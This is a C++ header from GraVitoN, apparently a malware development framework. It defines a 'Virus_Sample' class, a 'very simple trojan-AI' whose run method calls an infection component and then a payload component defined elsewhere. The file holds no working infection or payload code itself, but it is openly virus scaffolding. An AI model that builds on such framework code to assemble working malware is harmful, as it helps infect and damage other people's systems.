/**
 * @file
 *
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief A very simple trojan-AI
 *
 */

#ifndef _GVN_AI_VIRUS_SAMPLE_HEAD_
#define _GVN_AI_VIRUS_SAMPLE_HEAD_

#include <ai/ai.hpp>
#include <infect/infect.hpp>
#include <payload/payload.hpp>

namespace GraVitoN
{

namespace AI
{

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
  * @brief A Very Simple AI component for a virus
  * @see AI_Trojan_Sample
  */
class Virus_Sample : public AI::AI_Component
{
protected:
    Payload::Payload_Component &payload;
    Infect::Infect_Component &infect;

public:
    Virus_Sample(Payload::Payload_Component &_payload, Infect::Infect_Component &_infect);

    virtual ~Virus_Sample();

	virtual bool run();
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Virus_Sample::Virus_Sample (Payload::Payload_Component &_payload, Infect::Infect_Component &_infect):
    payload(_payload),
    infect(_infect)
{
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Virus_Sample::~Virus_Sample()
{
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Virus_Sample::run()
{
	bool suc = true;
    if( !infect.run() )
		suc = false;
    if( !payload.run() )
		suc = false;
	
    return suc;
}

}
}
#endif // _GVN_AI_VIRUS_SAMPLE_HEAD_
